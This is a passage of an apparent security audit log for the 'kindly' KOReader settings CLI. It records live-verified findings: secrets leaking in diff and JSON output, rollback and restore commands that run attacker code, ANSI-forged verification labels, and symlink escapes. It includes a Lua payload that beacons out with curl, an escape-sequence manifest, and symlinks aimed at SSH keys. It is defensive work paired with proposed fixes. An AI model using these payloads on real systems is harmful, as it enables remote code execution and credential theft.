  ~ pinpadlock_pin_code  "1379" → "0000"
  ~ refresh_rate  12 → 8
  ~ zlibrary_password  "VictimZlibPwLong_2026_04" → "attacker-zlib-pw"
  ~ zlibrary_username  "victim@example.com" → "attacker@evil.test"
(--dry-run — nothing written)
```

Every SECRET on the left side is a victim plaintext read off
settings.reader.lua (`pull` would have dropped them; `apply
--dry-run` prints them). `pinpadlock_message` is the
phone-number-in-practice key (docs/30 secrets denylist) — current
number visible too.

**Kindly side — S43a (full apply):** identical change list, then
`✓ applied`, exit 0, device now carries `["zlibrary_password"] =
"attacker-zlib-pw"` etc. Fully confirmed by re-grep of post-apply
`settings.reader.lua`.

**What this confirms.**

1. `apply`'s naked surface covers SECRETs in addition to SENSITIVE.
   The `src/lib/apply.ts` path imports nothing from classify.ts.
2. The diff renderer is a separate surface from the merge path.
   Even if §8.6 adds a SENSITIVE gate around merge, the renderer
   still leaks victim plaintext under `--dry-run` before any gate
   fires — because dry-run is precisely the "safe preview" users
   reach for when they're unsure. Redaction must happen in the
   renderer unconditionally for SECRET keys.
3. Realistic attack: not crypto-grade credential theft, but the
   targeting surface is wide. `zlibrary_username` + `zlibrary_password`
   overwrite hijacks the victim's library account for future
   downloads (downloads now attributed to attacker's account, or
   the attacker's account's abuse counts toward victim's IP).
   `calibre_wireless_password` lets attacker join the victim's
   Calibre-on-LAN session. `kosync.userkey` hijacks reading-
   position sync. `pinpadlock_message` replaces the "lost device"
   contact number — a recovery-channel hijack.
4. S20 (type-mismatch info leak) already identified that the diff
   renderer prints current values during overwrite preview. S43b
   confirms this is worse than S20 suggested: no type mismatch
   needed, no warning fires, happens on any SECRET overwrite.

**Implication for v0.11.2 (§8.6 + §8.4 upgrades).**

- **§8.6 extension:** the shared helper must classify SECRET *and*
  SENSITIVE. On SECRET overwrite, the default must be a policy
  block (exit 3), not a silent write. A `--accept-overwrite-secret
  <key>` per-key opt-in would mirror the setup-side granularity.
- **§8.4 generalization:** the diff renderer must redact SECRET
  values from both sides of `prev → next` regardless of whether
  the new value hits SENSITIVE or triggers any other warning. The
  renderer is a separate surface and its current behavior leaks
  under every apply path, not just type-mismatch.

Harness: `/tmp/kindly-s43-live/run.sh`. Fixture at
`/tmp/kindly-s43-live/` with placeholder-credential seed (values
are fake but realistic-shaped). Reproducible in ~2s — no KOReader
launch needed; the leak is at `kindly apply --dry-run`.

---

### S44 — `kindly rollback` = silent ingestion with no trust gates (live-verified)

**Fourth and broadest apply-path-adjacent finding.** Rollback is
documented as an undo primitive for `setup import`. It accepts a
directory argument — any directory — containing
`settings.reader.lua` and/or `plugins-patches.tar.gz`. It overwrites
device settings from the first file and extracts the second into
`mount.koreaderRoot`. Structurally equivalent to `setup import
--accept-plugins --accept-patches --accept-sensitive --accept-
overwrite-secret *` with **zero flags, zero warnings, zero
verification**. The fat tar has:

- no hash pinning (no manifest to pin against)
- no catalog check (W32 doesn't run on rollback)
- no scanner (W36 doesn't run on rollback)
- no SENSITIVE/SECRET diff (classify.ts not imported by
  `src/commands/rollback.ts`)

Only guards are size-cap and path-safety (F8) on the tar itself.

**The attack shape.** Attacker ships a "kindly snapshot dir" on any
file-drop surface (Dropbox folder, GitHub archive, a companion
tool that "imports" community setups). User is told: "run `kindly
rollback <dir>` to try my reading setup — safer than `setup import`
because it's a rollback". The command's own output reinforces this
— it prints `✓ restored 3 plugin/patch file(s)`, where "restored"
reads as safe user-data recovery but is actually raw code
extraction.

**The fake-snapshot.** Two files attackers can mint from scratch:

```
fake-snapshot/
├── settings.reader.lua        # attacker-chosen: plugins_disabled.terminal=false,
│                              #                  terminal_shell=/evil/probe.sh,
│                              #                  extra_plugin_paths=/evil/
└── plugins-patches.tar.gz     # plugins/s44evil.koplugin/{main.lua,_meta.lua}
                               # patches/2-autorun.lua
```

No kindly-specific format markers. Any tar.gz with those two
top-level directories and path-safe entries passes.

**Kindly side.**

```
$ kindly rollback /tmp/kindly-s44-live/fake-snapshot --mount <fixture>
rollback from /tmp/kindly-s44-live/fake-snapshot
  settings: settings.reader.lua
  fat state: 6 path(s) will be restored from plugins-patches.tar.gz
    - plugins/s44evil.koplugin/{_meta.lua,main.lua}
    - patches/2-autorun.lua
✓ restored settings.reader.lua
  pre-rollback backup: .kindly/pre-rollback/2026-04-23T19-00-16-231Z
✓ restored 3 plugin/patch file(s)
warn: restart KOReader (or your Kindle) for changes to take effect.
EXIT: 0
```

No `--accept-plugins`, no `--accept-sensitive`, no catalog
verdict, no scanner output, no mention of `code execution`.
The word "restored" in the success lines is positively
misleading — nothing is being *restored*, this is first-touch
extraction of attacker-supplied code.

**KOReader side.** Fresh launch reads post-rollback settings,
loads the extracted plugin, applies the extracted patch. Marker
**4 seconds** after launch:

```
04/23/26-22:00:16 INFO  Applying patch: .../patches/2-autorun.lua
04/23/26-22:00:16 INFO  Looking for plugins in directory: .../plugins
04/23/26-22:00:16 INFO  Looking for plugins in directory: /tmp/kindly-s44-live/fixture/koreader/plugins
04/23/26-22:00:17 INFO  s44evil: init fired — code reached via kindly rollback fat-tar extraction
04/23/26-22:00:19 INFO  s44evil: marker written + beacon sent
```

**Evidence captured.**

- `/tmp/kindly-s44-live/s44-marker.txt`:
  `2026-04-23T19:00:19Z S44 rollback plugin executed (delivered via plugins-patches.tar.gz in a fake snapshot dir, no flags, no catalog, no hash verification)`.
- Listener at `127.0.0.1:4444` received
  `GET /s44?ts=2026-04-23T19:00:19Z HTTP/1.1` 200.
- Both the plugin's attacker-shell-pointer settings (`terminal_shell`,
  `extra_plugin_paths`) AND the plugin itself landed — rollback is
  the only single command in kindly that delivers both surfaces
  at once.

**What this confirms.**

1. Rollback is a *third* trust-gate blind spot, after `apply`
   (S38/S42/S43) and the setup-import `extra_plugin_paths` case
   (W31a, defended there but bypassable via apply/rollback).
2. Worst single-command primitive so far: settings + plugins +
   patches in one `rollback`. S38/S42/S43 needed separate
   YAML tricks to reach each surface.
3. The rollback command's surface area assumes snapshot
   dirs are "trusted by construction" because they *usually* come
   from `.kindly/pre-import/<stamp>/`. But the command accepts
   any path — attacker-minted directories pass the existing
   structure checks trivially.
4. Pre-rollback backup is created even for attacker-fed rollbacks
   (`.kindly/pre-rollback/<stamp>/` holds the pre-attacker state).
   That's actually good — it means the user CAN unroll the
   attack via a second rollback into the pre-rollback dir. But
   they have to know the attacker-rollback happened.

**Implication for v0.11.2 (§8).** New item §8.7:

- **§8.7 Rollback-source trust gate.** `kindly rollback` must
  distinguish between kindly-produced snapshots and arbitrary
  directories. Minimum: a trust marker file written by kindly at
  snapshot-creation time (e.g., `.kindly-snapshot.meta` with the
  kindly version, a HMAC over the snapshot contents using a
  machine-local key stored in `.kindly/trust.key`, and the
  source-import-id). `rollback` refuses any directory without a
  valid marker; a `--trust-foreign-snapshot` opt-in flag lets the
  user acknowledge non-kindly-produced input. The HMAC detail
  matters — without a MAC, the attacker just copies the marker
  file verbatim from a user's real snapshot dir. Machine-local key
  makes the marker non-forgeable without filesystem access.
- Alternative (cheaper, weaker): rollback runs the setup-import
  verification pipeline on the fat tar (scanner, catalog check,
  SENSITIVE detector on settings). Doesn't stop S44 by itself if
  the attacker's tar is only an uncatalogued plugin (see S3) but
  at least surfaces advisories and fires the SENSITIVE gate on
  settings.

Harness: `/tmp/kindly-s44-live/run.sh`. Fake-snapshot at
`/tmp/kindly-s44-live/fake-snapshot/`. Reproducible in ~15s.

---

### S45 — `kindly diff` leaks SECRETs same as `apply --dry-run` (live-verified)

Straight code-read confirmation: `src/commands/diff.ts:84-96`
`renderChange` is structurally identical to apply's (prints
`fmt(c.prev) → fmt(c.next)` with no classify lookup, no redaction).
Re-ran the S43b attacker YAML through `kindly diff`:

```
$ kindly diff --mount /tmp/kindly-s43-live/fixture --file friend-shared.yaml
9 change(s) would be applied:
  ~ LocalSend_pin  "551234" → "999999"
  ~ calibre_wireless_password  "victim-calibre-PIN-9821" → "attacker-calibre-0000"
  ~ kosync.userkey  "deadbeefcafe0123victimtokenvalue" → "attacker-controlled-kosync-token"
  ~ kosync.username  "victim_kosync" → "attacker_kosync"
  ~ pinpadlock_message  "If found, please call +00 555 000 1234" → "Reward if returned. Call +00 555 999 8888"
  ~ pinpadlock_pin_code  "1379" → "0000"
  ~ refresh_rate  12 → 8
  ~ zlibrary_password  "VictimZlibPwLong_2026_04" → "attacker-zlib-pw"
  ~ zlibrary_username  "victim@example.com" → "attacker@evil.test"
```

Every victim plaintext again. `kindly diff` is positioned as the
*safe, read-only* inspection command (exits 1 on drift, git-diff
style). Two amplifying factors vs. S43b:

1. `kindly diff` is the command a cautious user reaches for. The
   mental model is "let me just see what apply *would* change
   without running it" — precisely the safety-focused path.
2. The `git diff`-style exit code invites piping into logs:
   `kindly diff | tee drift.log`, `kindly diff || notify "drift"`,
   CI jobs that persist diff output as a build artifact. Every
   pipe is an exfil channel if the YAML happens to carry SECRET
   keys (see S43a — attacker arranges this).

**Defended surface (for the record):** `kindly doctor`
(`src/commands/doctor.ts:78-87`) prints only SECRET *key names*
for password-manager-rescue advice, never values. That's correct.
`kindly pull` drops SECRETs entirely via `filterForYaml`
(classify.ts denylist) — also correct.

**Scope of S45.** The SECRET leak is in `renderChange`, which is
per-command. Apply, diff, and any other command that calls
`renderChange` (or reimplements it) needs the same redaction.

**Implication for v0.11.2 (§8.4).** Already scoped by §8.4
generalization: redact SECRETs in the diff renderer on both sides
of `prev → next`, unconditionally. The fix is one helper function
placed in `src/schema/classify.ts` (or adjacent) that returns
`«REDACTED»` or `«REDACTED (…ab12)»` (last 4 hex chars of SHA-256
for diff-usefulness) for SECRET keys. Apply, diff, and any future
diff-renderer callsite route through it.

Evidence: command output captured verbatim above. No KOReader
launch needed.

---

### S40 — ANSI injection forges `(VERIFIED ✓)` over `(UNVERIFIED)` label (live-verified)

**Promotes S7 from static claim to observed.** S7 was recorded as
"ANSI/control-char injection in author/source/description —
combines with S4 to produce all-green forged display". Now
demonstrated end-to-end against the real `setup import` dry-run
path.

**Mechanism.** `src/setup/schema.ts:88-99` validates
`meta.author`/`description`/`source_url` as
`z.string().optional()` — no length cap, no byte-class filter, no
sanitization. `src/commands/setup.ts:725-740` writes these
straight to stdout via `info(env, …)`, with a trailing `" " +
dim(env, "(UNVERIFIED)")` suffix. The author string itself can
contain CR (`\r`), ANSI color codes, and `\x1b[K` clear-to-EOL —
each of which is uninterpreted when the manifest is parsed as
YAML (double-quoted strings support `\x1b` hex escape) and each of
which activates when the bytes hit the terminal.

**The attacker manifest.** Lean `.kset.yaml` (same shape works in
a fat `.kset` — S4 already demoed fat-archive code drop; S40 adds
the display-forgery layer):

```yaml
kindly_setup: v1
apply_mode: additive
meta:
  name: friendly-pack
  author: "j.doe\r  author:       j.doe \x1b[1;32m(VERIFIED ✓ community-catalog-v1)\x1b[0m\x1b[K"
  description: "Popular PW5 reading setup."
  created_at: "2026-04-23T21:00:00Z"
settings:
  refresh_rate: 8
```

**Kindly side (raw bytes of `author:` line from dry-run stdout,
hex-dumped):**

```
  author:       j.doe\r  author:       j.doe \x1b[1;32m(VERIFIED ✓ community-catalog-v1)\x1b[0m\x1b[K (UNVERIFIED)
```

Key bytes: `0d` (CR) after the original `j.doe`, `1b 5b 31 3b 33 32
6d` (`\x1b[1;32m` bold green), UTF-8 ✓ (`e2 9c 93`), `1b 5b 30 6d`
(reset), `1b 5b 4b` (erase to end of line).

**What the user sees** in an interactive terminal (after `\r`
rewinds to column 0, the second label+name overwrites the first,
green activates, `\x1b[K` clears the `(UNVERIFIED)` suffix):

```
importing friendly-pack  (0906c6357767)
  from:   /tmp/.../friendly-pack.kset.yaml
  author:       j.doe (VERIFIED ✓ community-catalog-v1)       ← bold green
  description:  Popular PW5 reading setup.
```

The `(UNVERIFIED)` tag — the single most important trust signal
the import currently emits — is gone. The user sees a bold-green
"VERIFIED ✓ community-catalog-v1" attribution for a manifest that
is in reality unverified freeform YAML.

**Chained with S4.** Swap the lean manifest for a fat `.kset` with
a `bookshortcuts.koplugin` MATCH-hash + `patches/2-analytics-
hook.lua` byte-table payload (already live-verified in S4). The
user now sees a bold-green "VERIFIED" header while kindly prints
`scanner: 1 file(s) scanned, 2 suppressed by catalog — no novel
findings` and silently lands the patch on disk. The `✓ verified
by community` framing makes the "no novel findings" line read as
corroborating evidence.

**What this confirms.**

1. W33's identity-claim block is not just unverified (which it
   honestly admits with `(UNVERIFIED)`) — it is actively
   *forgeable*, because the suffix can be painted over by
   attacker-controlled bytes in the field it's trying to qualify.
2. The display-surface attack is independent of catalog, hash,
   and scanner. Even once S4 is closed (patch-tier gate added in
   §8.2), S40 still works against lean-manifest imports.
3. Many CI/automation setups would mask this: terminals without
   ANSI support, piped output to files, `--json` mode. But the
   target user — someone running `kindly setup import` interactively
   after downloading a community-shared manifest — is exactly the
   audience S40 targets.
4. Defense is trivial (one sanitizer, one choke point). This is
   low-hanging fruit in the hardening PR.

**Implication for v0.11.2 (§8.3 already covered).** §8.3
(Manifest identity-field sanitizer) was already written up as a
minimum hardening item based on static analysis. S40 promotes it
from speculative to load-bearing. Expand §8.3 scope slightly:

- Reject (do not render-escape) any byte in `0x00..0x1F` except
  `\n` and `\t`, and the C1 range `0x80..0x9F`. This is the same
  filter docs/30 says the settings-value renderer already applies
  (S25 evidence). Copy it to the identity-field renderer.
- Enforce max display length per field (say, 120 chars).
- Render each identity field on its own terminal line — even if a
  bare `\n` slips through, the line below can't visually leak the
  trailing `(UNVERIFIED)` tag onto the wrong key.
- Apply the same filter to `meta.name`, `meta.tags`, `sourceUrl`,
  `description`, and any other user-controlled field written to
  stdout.

Harness: `/tmp/kindly-s40-live/build-manifest.py` emits a lean
`friendly-pack.kset.yaml` with YAML `\x1b`-escape sequences in
`meta.author`. `bun run src/cli.ts setup import … --dry-run`
reproduces the forgery. Raw bytes captured in
`/tmp/kindly-s40-live/raw-stdout.bin`.

---

### S46 — `kindly restore` = fat-tar RCE in one command (live-verified)

**Sibling of S44 but cleaner attack shape.** S44 used
`kindly rollback <attacker-dir>` (a directory containing
`settings.reader.lua` + a fat tar). S46 uses `kindly restore
<attacker.tar.gz>` — a single-file attack artifact, no directory
choreography. Same root cause: `src/commands/restore.ts` imports
nothing from classify.ts; `assertSafeArchive` + `extractTarGz`
enforce only path-safety + size-cap; no hash, no catalog, no
scanner.

**The attacker tar.** One `.tar.gz`, built with `tar -czf`:

```
settings.reader.lua
plugins/s46evil.koplugin/_meta.lua
plugins/s46evil.koplugin/main.lua
patches/2-autorun.lua
```

**The command.** `kindly restore /tmp/evil.tar.gz --mount <fixture>`.
Zero flags. Exit 0. Output:

```
safety snapshot: /Users/claw/kindly/.kindly/pre-restore/…-Z.tar.gz
extracting 7 entries into <fixture>/koreader...
✓ restored 4 file(s) into <fixture>/koreader
warn: restart KOReader (or your Kindle) for changes to take effect.
```

The safety-snapshot line and the "restored" framing cast the
operation as *undoing harm*, not *installing code*. The "restart
KOReader" warning is the one true signal — same warning `kindly
apply` emits for a refresh_rate change.

**Live observation.** KOReader booted against the restored fixture:
`Applying patch: …/patches/2-autorun.lua` →
`s46evil: init fired — delivered via `kindly restore <fat-tar>`
with zero flags` → marker file written 4s after launch → listener
at `127.0.0.1:4646` received `GET /s46` 200.

**Why S46 belongs next to S44 but isn't a dup.**

- **Attack shape.** S44 needs a directory layout matching the
  snapshot convention (settings file at top + `plugins-patches.tar.gz`
  inside). S46 needs one self-contained `.tar.gz`. The latter is
  trivially shareable as a single URL / single forum attachment —
  strictly more weaponizable distribution.
- **User framing.** `rollback` implies "revert the last change";
  `restore` implies "install a complete configuration". Users who
  would be cautious of a rollback from an unknown source may be
  less cautious of a restore advertised as "my complete setup".
- **`--dry-run` does list all entries.** S46's dry-run showed every
  path, so a vigilant user *could* notice `plugins/…/main.lua`
  before executing. But the output caps at 50 entries — a fat
  snapshot with real plugins (6+ typical) buries the evil one in
  the middle of the list, and the kindly renderer offers no hint
  that ingesting a `.koplugin` is a code-execution decision.

**Implication for v0.11.2.** Extend §8.7 (originally scoped to
rollback) to cover `restore` — they share the same trust-gate
vacuum. The HMAC'd marker-file approach proposed for rollback
applies identically: `kindly snapshot` writes
`<tar>/.kindly-snapshot-marker` keyed to a machine-local secret
(stored under `~/.kindly/`); `kindly restore` refuses tars without
a valid marker. External tars require `--from-untrusted` which
triggers the same pipeline as `setup import` — scanner, catalog
lookup, `SENSITIVE`-key advisory. This closes S44/S46/S47 with
one mechanism.

Harness at `/tmp/kindly-s46-live/`. Reproducible in ~15s.

---

### S47 — snapshot-as-distribution: kindly's own tools are the attack framework (live-verified)

**Weaponization requires no custom tooling.** S46 proved `restore`
ingests untrusted tars. S47 proves the *producer* side is
`kindly snapshot` — the attacker never constructs a tar manually.

**The chain.**

1. Attacker compromises their own kindle (trivially — it's theirs).
   Lands an evil plugin under `plugins/s47evil.koplugin/`.
2. Attacker runs `kindly snapshot --label "my-cozy-pw5-setup"
   --output my-reading-setup.tar.gz`. Output:

   ```
   ✓ wrote /…/my-reading-setup.tar.gz
     1.4 KB, 3 root path(s)
       settings.reader.lua
       patches
       plugins
   warn: this archive contains plaintext secrets — do NOT commit to git.
     (secrets live in settings.reader.lua: PIN, zlibrary password, …)
   ```

   The only warning is about leaking the *attacker's own* secrets
   (a non-issue for them). **Zero warnings about plugin code
   being included**, because kindly has no concept of "plugin I
   wrote" vs "plugin dropped by a previous compromise" — it tars
   what's on disk.

3. Attacker shares `my-reading-setup.tar.gz` on a forum:
   *"Here's my complete PW5 reading setup — just `kindly restore`."*
4. Victim on clean fixture runs `kindly restore
   my-reading-setup.tar.gz`. Plugin + patch + settings extracted.
5. Victim launches KOReader. `s47evil: init fired`. Marker + `GET
   /s47` 200 at `127.0.0.1:4747`, 4s after launch.

**What makes this novel vs S46.**

- **Blessed-looking output.** The attacker's tar was produced by
  kindly itself. No suspicious structure. `file` metadata, tar
  layout, and even the output filename (`kindly-snapshot-*.tar.gz`
  by default) are indistinguishable from a legitimate user
  backup.
- **Trust-tier origin loss.** A snapshot the user took yesterday
  and a snapshot from a forum post look identical to `kindly
  restore`. There is no "origin" metadata in the tar. Compare with
  `.kset` which at least carries `meta.author` / `meta.source_url`
  (forgeable, but at least the *concept* exists).
- **Natural distribution channel.** Posting a `.kset` on a forum
  requires the user to understand kindly's setup format. Posting
  a snapshot is framed as *sharing a backup* — a user-facing
  mental model that exists in every backup tool ever. The
  distribution story writes itself.

**Status of §9 item S29.** S29 was listed as "snapshot/restore
round-trip — does restore re-fire the W31 gate?". S44 + S46 + S47
answer this completely: no, restore has no W31 equivalent; the
auto-pre-import snapshot captures pre-attack state (benign);
*subsequent* user snapshots propagate compromise (S47). Mark S29
as ✅ covered.

**Implication for v0.11.2.** Same §8.7 mechanism as S46: HMAC'd
marker keyed to a machine-local secret. Attacker's snapshot won't
carry a marker valid on the victim's machine; restore refuses
without `--from-untrusted`, which triggers the full setup-import
pipeline. Also consider `meta.producer_fingerprint` in the
snapshot tar — at minimum a human-readable *machine name* that
differs between attacker and victim, so the victim sees "this
snapshot was produced on host `foo.local` at 2026-04-23 — does
that match your setup?" before extraction.

Harness at `/tmp/kindly-s47-live/`. Reproducible in ~15s; uses
kindly's snapshot + restore commands end-to-end, no custom tar.

---

### S48 — `--json` mode carries the same SECRET leak (live-verified, generalizes S43b/S45)

**Machine-readable twin of S43b + S45.** S43b proved `apply --dry-run`
leaks 5 SECRET plaintexts in its human-readable diff. S45 showed
`kindly diff` has the same leak. S48 shows the `--json` envelope
on both commands carries the values too — in fact twice, because
`DiffResult.grouped` re-emits the same changes in a grouped
sub-object.

**Root cause.** `computeChanges()`
(`src/schema/diff.ts:46`) operates on unfiltered on-device data;
`Change` entries carry `prev`/`next` verbatim. The JSON emitter
(`src/cli/json.ts:82`) serializes the whole result tree with no
classify lookup, no redaction. Same gap as the human renderer
(`apply.ts:91-100`, `diff.ts:84-96`), just a different output
path.

**Repro** (independent verification against the real CLI, fixture
with all 5 SECRET keys seeded, attacker YAML overwriting each):

```bash
bun run src/cli.ts apply --file attack.yaml --mount /tmp/audit-A-verify --dry-run --json
bun run src/cli.ts diff  --file attack.yaml --mount /tmp/audit-A-verify --json
```

Both stdouts contain every victim plaintext:

```
1379
551234
deadbeefcafe0123victimtokenvalue
victim-calibre-PIN-9821
VictimZlibPwLong_2026_04
```

**Why S48 is worse than S43b/S45, not just equivalent.**

- **JSON is the automation output format.** CI pipelines, cron
  drift-detectors, dashboards, and anything that pipes kindly
  into `jq` request `--json` by default. Every such pipe is an
  exfil channel — and JSON output typically lands in structured
  log stores (Splunk, Datadog, S3 buckets) that retain long, are
  readable across teams, and survive the user's local terminal.
- **Double emission.** `DiffResult.grouped` re-serializes each
  change in a category-keyed sub-object. The verification run
  caught duplicate values for the diff command (`value\` +
  `value` patterns in the grep output). Every leak is two copies
  in the JSON tree — ensures the key won't be lost to JSON path
  filters.
- **Harder to notice.** Human diff output is visually scannable —
  a user pasting it into a bug report might see "oh, that looks
  like a password". JSON fields with generic names (`prev`,
  `next`, `before`, `after`) carry values without
  visual-context hints.

**Implication for v0.11.2.** §8.4 generalization now spans three
output paths: (1) apply human renderer (`apply.ts:91-100`), (2)
diff human renderer (`diff.ts:84-96`), (3) JSON envelope
(`json.ts:82`). The fix is one shared helper in classify.ts:
`redactForDisplay(key, value) → value | "<redacted-zlibrary_password>"`.
Every change-renderer — human OR JSON — routes through it. No
renderer-specific policy. No opt-out flag (§8.4 rule: SECRET
redaction is unconditional; if a user needs to see their own
secret they pull it from settings.reader.lua directly, which is
an explicit machine-local action).

No KOReader launch needed — the leak is at kindly's stdout. Credit:
independent code-audit pass (concurrent with S46/S47 live runs)
against `src/schema/diff.ts`, `src/cli/json.ts`, `computeChanges`
call sites.

---

### S49 — `defaults.custom.lua` as a third code-drop surface (live-verified)

**Generalizes the restore-path code-exec surface from 2 files
(plugins/patches) to at least 5.** KOReader's settings files are
loaded via `pcall(dofile, <file>)` — any top-level Lua in the file
runs at boot. Every file in kindly's `SNAPSHOT_PATHS` is such a
file. Demonstrated with `defaults.custom.lua`; pattern extends to
`history.lua` and `settings.reader.lua.old` with the same
primitive, confirmed by static source read:

| File | Loader | Evidence |
|------|--------|----------|
| `plugins/<name>/main.lua` | pluginloader.lua:140-162 (dofile) | S46/S47 live |
| `patches/*.lua` | frontend/userpatch.lua (dofile) | S44/S46 live |
| **`defaults.custom.lua`** | **frontend/luadefaults.lua:29 `pcall(dofile, …)`** | **S49 live, marker in 2s** |
| `history.lua` | frontend/readhistory.lua:110 `pcall(dofile, history_file)` | static-confirmed, not live-demo'd |
| `settings.reader.lua.old` | frontend/luasettings.lua:37 `pcall(dofile, new.file..".old")` | **live-verified 2026-04-24 via GGG dual-file probe** — main returns `nil` (triggers `ok and stored` false), `.old` executes attacker Lua in top-level `do…end`; marker written at boot |

**The attacker tar (minimal — two files).**

```
settings.reader.lua   (benign-looking, just refresh_rate + home_dir)
defaults.custom.lua   (payload rides in top-level pcall(fn) before `return { … }`)
```

Attacker's `defaults.custom.lua`:

```lua
local function s49_payload()
    local f = io.open("/tmp/kindly-s49-live/s49-marker.txt", "w")
    if f then f:write(os.date("!%Y-%m-%dT%H:%M:%SZ") .. " S49 …\n"); f:close() end
    os.execute("curl -s -m 2 'http://127.0.0.1:4949/s49' >/dev/null 2>&1 || true")
end

pcall(s49_payload)  -- runs at KOReader boot via LuaDefaults:open → pcall(dofile, file)
return { DEBUG = false }
```

**The command.** `kindly restore /tmp/evil.tar.gz --mount <fixture>`.
Zero flags. Exit 0. `✓ restored 2 file(s)`.

**Live observation.** Marker file written **2 seconds** after
KOReader launch (faster than any plugin-based delivery —
`LuaDefaults:open` runs very early in startup, before plugin
loader scans). Listener at `127.0.0.1:4949` received `GET /s49`
200. No `.koplugin` directory structure, no `_meta.lua`, no
priority-coded patch filename — just one Lua file.

**Why S49 matters as a distinct finding.**

- **Lower ceremony** than S46/S47 — no plugin directory, no
  manifest-shaped file, no patches/ priority code. A single Lua
  file that's framed as "config override".
- **Earlier execution** — runs in KOReader's early init (before UI,
  before plugin loader). Less time for any defensive hook to fire.
- **Less recognizable as code** to a user auditing a snapshot.
  Defenders scanning `plugins/` and `patches/` for
  executable-looking content may not think to open
  `defaults.custom.lua`.
- **Already in `SNAPSHOT_PATHS`** — `kindly snapshot` tars it
  silently alongside plugins/patches. Every S47 distribution
  carries this surface whether the attacker uses it or not.
- **Scope widener for §8.7.** Any hardening item that enumerates
  "gate plugins/ and patches/" specifically is incomplete. The
  rule must be *"any Lua file in the restore tar is a code-drop
  surface — HMAC the full tar, not a subset of paths"*.

**Important non-finding: `kindly apply` is NOT a vector for this
primitive on `settings.reader.lua`.** Apply constructs settings
files from scratch via `lua/writer.ts`, which escapes values
(S30 verified). Top-level code cannot be smuggled through YAML
into a kindly-authored settings file. The vector is exclusively
the **raw-extraction paths**: rollback (S44), restore (S46/S49),
and snapshot round-trip (S47).

Harness at `/tmp/kindly-s49-live/`. Reproducible in ~8s.

---

### S50 — symlink entries in restore tars bypass path-safety (live-verified)

**Categorical break of the extraction-safety invariant, moderate
impact.** `isSafeRelativePath` validates tar entry *paths* but not
symlink *targets*. A tar entry at safe relative path `stash` whose
symlink target is `/Users/victim/.ssh/id_ed25519` passes the filter
and extracts as a symlink on the victim's filesystem, target intact.

**The gap.** `src/fs/archive.ts:212-217` (and `assertSafeArchive`
at :194-199) list entries via `tar -tzf` (path names only — no file
type) and validate each path with `isSafeRelativePath`. The
extraction command is `tar -xzf archive -C destRoot` (line 219) —
BSD tar extracts symlinks as symlinks by default, target intact,
no validation. Entry type is invisible to the path-safety check.

**Observed behavior** (three probes against a fresh fixture):

1. Tar with `stash -> /tmp/kindly-s50-live/secret/stolen-data.txt`
   (a pre-planted "host secret" file): `kindly restore` exits 0,
   `ls -la <fixture>/koreader/stash` shows
   `lrwxr-xr-x stash -> /tmp/kindly-s50-live/secret/stolen-data.txt`.
   `cat <fixture>/koreader/stash` returns `HOST_SECRET: this file
   is outside any kindly workspace` — extraction-root sandbox
   breached by read-side follow.

2. Tar with symlinks under `plugins/` pointing at
   `/Users/claw/.ssh/id_ed25519` and `/Users/claw/.zsh_history`:
   extraction succeeds, targets preserved. Attacker's snapshot on
   the VICTIM machine would carry these symlinks *as symlinks*
   (not dereferenced — kindly's `createTarGz` at `archive.ts:63`
   uses `tar -czf` without `-h`/`--dereference`, so BSD tar
   preserves them). When the attacker extracts the shared snapshot
   on their own machine, the symlinks are broken (point at paths
   absent on attacker's box). Direct "plant-then-snapshot-then-
   share" exfil is neutralized by default BSD tar behavior.

3. **Cross-install bridging (live-exfiled):** tar with
   `settings.reader.lua` as a symlink to `/tmp/kindly-s50-
   otherinstall/koreader/settings.reader.lua` (simulating a second
   KOReader install on the same machine). After `kindly restore`,
   `kindly diff --file my.yaml --mount <fixture>` prints:

   ```
   ~ home_dir  "/home/someone-else" → "/mnt/us/documents"
   ```

   The `"/home/someone-else"` `prev` value is from the OTHER
   install, bridged through the symlink. `kindly pull --full`
   produced `leaked.yaml` containing `home_dir: /home/someone-
   else` plus all other non-SECRET keys from the bridged file.
   **Exfil works for non-SECRET values across installs on the
   same host.** SECRETs still strip correctly because
   `filterForYaml` runs regardless of backing storage — but
   that is an accidental save, not a deliberate symlink defense.

**What this is and isn't.**

- **Is:** a categorical break of the extraction-root sandbox.
  `kindly restore/rollback` is now an *arbitrary-symlink-creation*
  primitive inside the victim's filesystem. Any downstream tool
  that reads `<mount>/koreader/` assuming path-safety inherits
  the break. Cross-install info-disclosure via kindly's own
  diff/pull renderers (non-SECRET values) is confirmed.
- **Is not:** direct code execution. KOReader's `dofile` on a
  symlink to a non-Lua file fails with a syntax error, not code-
  exec. `safeWrite` uses `rename(tmp, final)` which replaces the
  symlink with a regular file on first apply — so write-side
  symlink clobber of host files is limited to paths apply never
  writes to (and apply specifically writes only `settings.reader.
  lua`). Direct snapshot-to-forum exfil is neutered by BSD tar's
  no-dereference default at creation time.

**Severity rating: moderate.** Not RCE. Info-disclosure plus
invariant-break, with credible chains (cross-install exfil via
predictable KOReader paths like `~/Library/Application Support/
koreader/settings.reader.lua`, or third-party tools reading
destRoot).

**Defense (extends §8.7).** During `assertSafeArchive` and
`extractTarGz`, reject any tar entry whose listing-verbose mode
starts with `l` (symlink) or `h` (hardlink). Implementation: replace
`tar -tzf` with `tar -tvzf`, parse the mode column. Reject on any
non-regular-file, non-directory entry type. Alternative: migrate
extraction away from `spawnSync("tar", …)` to an in-process tar
reader with explicit entry-type filtering. Either closes S50 and
hardens against similar variants (device nodes, FIFO, etc. — BSD
tar by default won't create these as non-root, but the
invariant-level fix covers them all).

Harness: `/tmp/kindly-s50-live/` with three stages
(`stage`/`stage2`/`stage3`) and bridging target at
`/tmp/kindly-s50-otherinstall/`. Reproducible in ~10s.

---

### S51 — `kindly rollback <dir>` is a fourth tar-ingestion RCE surface (live-verified)

**Full RCE via social-engineered `kindly rollback` on an attacker-
supplied directory. Sibling of S44/S46/S49 via a distinct command
name.** `rollback.ts:73` resolves `snapshotDir` against `env.cwd`
with no constraint that it live under `.kindly/pre-import/` or any
other kindly-owned state. The path-safety scan at `:101-110` only
runs `isSafeRelativePath` on tar entry *names*, which plain plugin
paths (`plugins/evil.koplugin/main.lua`) trivially pass. Line :167
then `extractTarGz`s the attacker tar into `mount.koreaderRoot`.

**The gap.** Rollback was designed as the "undo" side of
`setup:import` / `apply`, which produce snapshots at predictable
`.kindly/pre-*/` paths. But nothing in `executeRollback` anchors
the snapshot path to those locations, nor checks that the
containing dir is a kindly-authored one (there is no
`.kindly-snapshot` marker, no HMAC, no hash check against
`history.jsonl`). Any directory containing a file literally named
`plugins-patches.tar.gz` is a valid rollback source.

**Observed behavior.** Attacker prepared
